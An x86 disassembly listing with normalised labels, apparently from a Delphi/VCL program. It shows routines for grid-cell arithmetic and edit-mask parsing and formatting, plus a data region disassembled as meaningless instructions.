cmp edx [ ebx + 0x270 ]
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp [ ebx + 0x285 ] 0x0
jne r-xdata
mov edx eax
mov eax ebx
call sub_46bfa8
mov cl 0x1
sub_46cb24
push ebx
cmp dl [ eax + 0x284 ]
je r-xdata
pop ebx
retn
mov ebx edx
mov [ eax + 0x284 ] bl
mov ecx ebx
mov edx 0x10
shr edx cl
mov [ eax + 0x27c ] edx
mov cl [ eax + 0x284 ]
mov edx 0x1
shl edx cl
mov [ eax + 0x280 ] edx
mov dl 0x1
call sub_46cbe8
sub_46cb60
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x270 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx eax
mov eax ebx
call sub_46bfa8
mov eax esi
mov [ ebx + 0x270 ] eax
mov cl [ ebx + 0x285 ]
mov edx eax
mov eax ebx
call sub_46bfa8
mov eax ebx
call sub_46c1bc
sub_46cb9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
dec eax
cmp esi eax
jle r-xdata
test esi esi
jge r-xdata
mov esi eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
dec eax
cmp ecx eax
jle r-xdata
xor esi esi
test ecx ecx
jge r-xdata
mov ecx eax
jmp r-xdata
mov eax ecx
cdq
idiv [ ebx + 0x278 ]
mov ecx eax
imul ecx [ ebx + 0x27c ]
mov eax esi
cdq
idiv [ ebx + 0x274 ]
add ecx eax
mov eax ecx
pop esi
pop ebx
retn
xor ecx ecx
sub_46cbe8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x48 ]
mov ecx [ ebp + 0x27c ]
cdq
idiv ecx
mov esi eax
imul esi ecx
mov eax [ ebp + 0x4c ]
mov ecx [ ebp + 0x280 ]
cdq
idiv ecx
mov edi eax
imul edi ecx
push edi
lea eax [ esp + 0x4 ]
push eax
mov ecx esi
mov edx [ ebp + 0x44 ]
mov eax [ ebp + 0x40 ]
call sub_4129d8
mov edx esp
mov eax ebp
call sub_43d7b8
mov eax [ ebp + 0x48 ]
cdq
idiv [ ebp + 0x27c ]
mov [ ebp + 0x274 ] eax
mov eax [ ebp + 0x4c ]
cdq
idiv [ ebp + 0x280 ]
mov [ ebp + 0x278 ] eax
test bl bl
je r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46cc88
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46ccad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ccb4
retn
sub_46ccd0
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x0
mov eax esi
call sub_404334
cmp edi eax
jg r-xdata
mov eax esi
call sub_404334
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
mov [ esp ] al
mov edx edi
mov eax esi
call sub_40bff0
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp edi 0x1
jle r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
cmp al [ rw-data ]
jne r-xdata
cmp [ esi + edi - 0x2 ] 0x5c
jne r-xdata
mov eax esi
call sub_404334
cmp eax 0x4
jl r-xdata
mov eax esi
call sub_404334
cmp eax 0x4
jl r-xdata
mov edx edi
dec edx
mov eax esi
call sub_40bff0
test al al
jne r-xdata
mov al [ esp ]
sub al 0x2f
je r-xdata
mov eax esi
call sub_404334
sub eax 0x4
cmp edi eax
jle r-xdata
mov eax esi
call sub_404334
sub eax 0x4
cmp edi eax
jle r-xdata
cmp edi 0x2
jle r-xdata
mov bl 0x2
jmp r-xdata
sub al 0xb
jne r-xdata
mov al [ esi + edi - 0x2 ]
cmp al [ rw-data ]
jne r-xdata
mov bl 0x6
jmp r-xdata
mov bl 0x1
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
mov al [ esp ]
sub al 0x21
je r-xdata
cmp edi 0x2
jle r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40bff0
test al al
je r-xdata
mov bl 0x3
jmp r-xdata
sub al 0x1b
je r-xdata
mov bl 0x7
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
sub al 0x2
je r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40bff0
cmp al 0x2
jne r-xdata
sub al 0x1e
jne r-xdata
mov al [ esp ]
sub al 0x23
je r-xdata
mov bl 0x5
jmp r-xdata
sub al 0x16
je r-xdata
sub al 0x28
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
mov al [ esp ]
sub al 0x30
je r-xdata
mov bl 0x4
sub al 0x11
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
sub_46ce24
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov bl [ r-xdata ]
mov eax edi
call sub_404334
mov esi eax
test esi esi
jle r-xdata
mov edx [ esp ]
mov eax edi
call sub_46ccd0
cmp al 0x1
jne r-xdata
mov ebp 0x1
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or bl 0x8
cmp al 0x3e
jne r-xdata
or bl 0x1
jmp r-xdata
cmp al 0x3c
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
inc ebp
dec esi
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
and bl 0xfb
cmp ebp 0x1
jle r-xdata
mov al [ edi + ebp - 0x1 ]
cmp al 0x21
jne r-xdata
and bl 0xfd
or bl 0x4
or bl 0x2
jmp r-xdata
cmp [ edi + ebp - 0x2 ] 0x3c
je r-xdata
sub_46cea0
mov edx eax
sub al 0x2f
je r-xdata
mov edx [ rw-data ]
mov dl [ edx ]
sub al 0xb
jne r-xdata
mov eax edx
retn
mov edx [ rw-data ]
mov dl [ edx ]
mov eax edx
retn
sub_46cec0
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46d0ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx esi
call sub_4040c8
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_46ce24
mov [ ebp - 0x11 ] al
test [ ebp - 0x11 ] 0x1
jne r-xdata
mov eax [ ebx ]
call sub_404334
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_404334
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_404334
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d0d1
lea eax [ ebp - 0x38 ]
mov edx 0x8
call sub_404098
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] eax
mov esi 0x1
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx ]
mov ecx [ ebp - 0x10 ]
mov edx 0x1
call sub_404594
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_46cea0
mov edx eax
lea eax [ ebp - 0x30 ]
call sub_40425c
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebx ]
call sub_404334
mov ecx eax
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
inc edx
mov eax [ ebx ]
call sub_404594
push [ ebp - 0x34 ]
mov eax ebx
mov edx 0x3
call sub_4043f4
jmp r-xdata
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x10 ]
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404594
push [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_46cea0
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_40425c
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
call sub_404334
mov ecx eax
sub ecx [ ebp - 0x10 ]
inc ecx
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
call sub_404594
push [ ebp - 0x24 ]
mov eax ebx
mov edx 0x3
call sub_4043f4
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebx ]
call sub_404334
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404334
mov esi eax
sub esi [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_46ccd0
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x5 ]
call sub_40425c
mov edx [ ebp - 0x38 ]
mov ecx [ ebx ]
mov eax ebx
call sub_404380
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_46ccd0
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
jmp r-xdata
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x28 ]
mov dl [ ebp - 0x5 ]
call sub_40425c
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_40433c
sub_46d0dc
push ebx
push esi
push edi
push ebp
push ecx
mov esi eax
mov [ esp ] 0x1
mov eax esi
call sub_404334
cmp eax 0x4
jl r-xdata
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or ebp 0xffffffff
or edi 0xffffffff
mov eax esi
call sub_404334
mov ebx eax
dec ebx
test ebx ebx
jle r-xdata
test ebp ebp
jge r-xdata
test edi edi
jge r-xdata
mov eax esi
call sub_404334
sub eax 0x4
cmp ebx eax
jl r-xdata
mov edi ebx
mov ebp ebx
jmp r-xdata
test edi edi
jle r-xdata
mov edi ebp
test edi edi
jl r-xdata
mov eax esi
call sub_404334
cmp edi eax
je r-xdata
mov edx ebx
mov eax esi
call sub_46ccd0
cmp al 0x6
jne r-xdata
mov al [ esi + edi ]
cmp al [ rw-data ]
sete al
xor al 0x1
mov [ esp ] al
sub_46d160
push ebx
push esi
mov esi eax
mov bl [ rw-data ]
mov eax esi
call sub_404334
cmp eax 0x4
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_404334
mov edx eax
dec edx
mov eax esi
call sub_46ccd0
cmp al 0x6
jne r-xdata
mov eax esi
call sub_404334
mov edx eax
sub edx 0x2
mov eax esi
call sub_46ccd0
cmp al 0x6
je r-xdata
mov eax esi
call sub_404334
mov bl [ esi + eax - 0x1 ]
mov eax esi
call sub_404334
mov edx eax
sub edx 0x3
mov eax esi
call sub_46ccd0
cmp al 0x6
jne r-xdata
sub_46d1cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_46d249
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404074
mov esi ebx
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d250
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov ebx 0x1
inc ebx
dec esi
jne r-xdata
add al 0xfd
sub al 0x2
jb r-xdata
mov edx ebx
mov eax edi
call sub_46ccd0
sub al 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
mov dl [ edi + ebx - 0x1 ]
call sub_40425c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40433c
mov eax [ ebp - 0x4 ]
sub_46d258
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d29d
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_46d1cc
mov eax [ ebp - 0x4 ]
call sub_404334
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d2a4
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_46d2ac
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov eax edi
call sub_404334
mov edx eax
mov eax edi
call sub_46d258
cmp eax ebx
jge r-xdata
xor ebp ebp
mov [ esp ] ebx
mov eax edi
call sub_404334
mov ebx eax
test ebx ebx
jle r-xdata
or ebp 0xffffffff
jmp r-xdata
mov eax ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi 0x1
inc esi
dec ebx
jne r-xdata
dec [ esp ]
cmp [ esp ] 0x0
jl r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_46ccd0
cmp al 0x3
je r-xdata
sub_46d308
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_46d2ac
test eax eax
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_46ccd0
dec eax
sub al 0x2
setb bl
sub_46d330
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x14 ]
xor eax eax
push ebp
push sub_46d4b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jle r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_46ce24
mov [ ebp - 0x9 ] al
mov eax esi
dec eax
mov [ ebp - 0x10 ] eax
test [ ebp - 0x9 ] 0x1
je r-xdata
mov eax ebx
mov edx edi
call sub_4040c8
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_46ce24
mov [ ebp - 0x9 ] al
test [ ebp - 0x9 ] 0x1
je r-xdata
push ebx
mov ecx [ ebp - 0x10 ]
mov edx 0x1
mov eax edi
call sub_404594
sub esi [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax esi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax edi
call sub_404334
mov ecx eax
mov edx esi
mov eax edi
call sub_404594
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp + 0x10 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_404594
mov edx [ ebp - 0x28 ]
mov eax ebx
pop ecx
call sub_404380
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_404334
mov ecx eax
mov edx esi
sub edx [ ebp + 0x10 ]
mov eax edi
call sub_404594
mov eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x8 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_404594
mov edx [ ebp - 0x20 ]
mov eax ebx
pop ecx
call sub_404380
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
call sub_404334
mov ecx eax
mov edx [ ebp - 0x10 ]
inc edx
mov eax edi
call sub_404594
mov edx [ ebp - 0x18 ]
mov eax ebx
call sub_40433c
jmp r-xdata
mov esi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d4bc
lea eax [ ebp - 0x28 ]
mov edx 0x6
call sub_404098
retn
lea eax [ ebp - 0x14 ]
mov dl [ ebp + 0xc ]
call sub_40425c
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_40433c
dec esi
jne r-xdata
sub_46d4c8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46d68e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx edi
call sub_4040c8
mov eax esi
call sub_404334
test eax eax
jle r-xdata
mov eax esi
call sub_404334
mov edx eax
mov eax esi
call sub_46d258
mov edi eax
mov eax [ ebx ]
call sub_404334
cmp edi eax
je r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x1
mov eax [ ebx ]
call sub_404334
test eax eax
jle r-xdata
mov eax [ ebx ]
call sub_404334
inc eax
push eax
sub edi [ ebp - 0x8 ]
push edi
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
inc ecx
mov edx [ ebx ]
mov eax esi
call sub_46d330
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_4040c8
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_46d258
mov [ ebp - 0x10 ] eax
mov eax [ ebx ]
call sub_404334
inc eax
mov [ ebp - 0xc ] eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebx ]
call sub_404334
sub eax edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d695
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_404098
retn
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x1
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_46ccd0
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebx ]
call sub_404334
cmp eax [ ebp - 0xc ]
jge r-xdata
inc eax
mov [ ebp - 0x1c ] eax
inc [ ebp - 0x10 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
dec edx
mov eax esi
call sub_46d308
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebp - 0x10 ]
sub eax edi
push eax
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov edx [ ebx ]
mov eax esi
call sub_46d330
mov edx [ ebp - 0x24 ]
mov eax ebx
call sub_4040c8
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_46cea0
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_40425c
mov edx [ ebp - 0x20 ]
mov eax ebx
call sub_40433c
inc edi
dec [ ebp - 0x1c ]
jne r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
mov eax ebx
call j_sub_404540#2
mov edx [ ebp - 0x10 ]
mov cl [ ebp - 0x1 ]
mov [ eax + edx - 0x1 ] cl
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_46cea0
mov edx [ ebx ]
cmp al [ edx + edi - 0x1 ]
jne r-xdata
sub_46d6a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46d6c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d6cc
retn
sub_46d6dc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xd7
inc esi
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
inc ebx
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
dec eax
add al 0x44
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
or al 0x45
inc esp
inc edx
inc ebp
imul esi [ fs : ebp + eax * 2 + 0x72 ] 0x8d726f72
jb r-xdata
add [ eax ] dl
push ecx
inc esp
add [ eax ] bh
sbb [ eax + eax + 0x34 ] eax
inc esp
inc ecx
add ah cl
inc [ ebx ]
enter 0x43d2 0x0
in al dx
add eax 0xdbe00044
inc ebx
add [ eax + ebp * 4 + 0x41 ] ch
inc esi
add [ eax + 0x2 ] al
add [ eax ] al
pop eax
fld [ edx ]
push esp
test al 0x41
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add [ esp + 0x32380043 ] bl
inc eax
add [ edx + esi + 0x40 ] dl
add [ eax + 0x4 ] cl
inc esp
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax ] bl
fld [ esi ]
and al 0x4c
inc esp
add [ eax + 0x51 ] al
inc esp
add [ eax + edx * 2 - 0x2ec3ffbc ] cl
inc ebx
add [ eax - 0x3fffbbba ] ah
inc esi
inc esp
add al bl
inc ebx
inc esp
add [ eax + edx * 8 - 0x2f77ffbd ] al
inc ebx
add [ eax + eax + 0xc80044 ] bl
inc esp
add [ esi + ebx + 0x43 ] ch
add [ eax ] al
rol [ ebx ] cl
push esp
fld [ ebx ]
int3
jb r-xdata
push sub_46d6cc
retn
inc eax
add [ eax + 0x46d7 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 8 + 0x46 ] bh
add ah dh
fadd [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esi eax
fadd [ esi ]
loopne r-xdata
sub_46d918
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_431da4
mov al [ r-xdata ]
mov [ esi + 0x22d ] al
mov eax [ rw-data ]
mov al [ eax ]
mov [ esi + 0x224 ] al
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_46d96c
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov eax ebx
call sub_46def4
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_443424
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test [ esp ] 0x2
jne r-xdata
cmp [ esi ] 0x25
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_46e5d0
test [ esp ] 0x1
jne r-xdata
cmp [ esi ] 0x27
jne r-xdata
test [ esp ] 0x4
jne r-xdata
cmp [ esi ] 0x26
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x28
jne r-xdata
cmp [ esi ] 0x24
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_46e868
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x23
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
cmp [ esi ] 0x8
jne r-xdata
test [ esp ] 0x1
je r-xdata
mov eax ebx
call sub_46e384
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov dx [ esi ]
mov eax ebx
call sub_46e938
sub_46da4c
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov eax ebx
call sub_46def4
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_44350c
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
cmp [ esi ] 0x25
je r-xdata
test [ esp ] 0x4
je r-xdata
cmp [ esi ] 0x27
jne r-xdata
mov eax ebx
call sub_46e384
sub_46da9c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4435dc
mov eax esi
call sub_46def4
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
mov al [ ebx ]
sub al 0x3
je r-xdata
sub al 0x13
je r-xdata
sub al 0x2
je r-xdata
mov edx ebx
mov eax esi
call sub_46e3f8
mov [ ebx ] 0x0
sub_46daf4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f7a8
mov eax ebx
call sub_46def4
test al al
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_46e0cc
mov eax [ esp ]
mov [ ebx + 0x230 ] eax
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov eax ebx
call sub_46e384
movsx eax [ esi + 0x8 ]
cmp eax [ ebx + 0x234 ]
jle r-xdata
mov eax [ esp + 0x4 ]
mov [ ebx + 0x230 ] eax
sub_46db74
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46dbd0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46dbdc
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404480
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dbd7
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax esi
call sub_404534
mov edx eax
mov eax ebx
call sub_43ddd4
mov eax ebx
call sub_46e384
sub_46dbf0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46dc30
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46dc40
mov eax [ ebp - 0x4 ]
call sub_404334
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dc37
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_46dc40
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46dcc4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46def4
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46dbdc
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_46ed04
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43ddf8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dccb
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
lea eax [ ebp - 0x8 ]
push eax
mov edx [ esi ]
xor ecx ecx
mov eax ebx
call sub_46ecbc
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4040c8
sub_46dcd4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46ddca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46def4
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40410c
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43de28
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46ecbc
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_40410c
lea eax [ ebp - 0xc ]
push eax
mov cl [ ebx + 0x224 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x220 ]
call sub_46d4c8
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_40410c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ddd1
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404098
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46db74
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x22d ] 0x4
jne r-xdata
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
sub_46ddd8
push ebx
push esi
mov esi edx
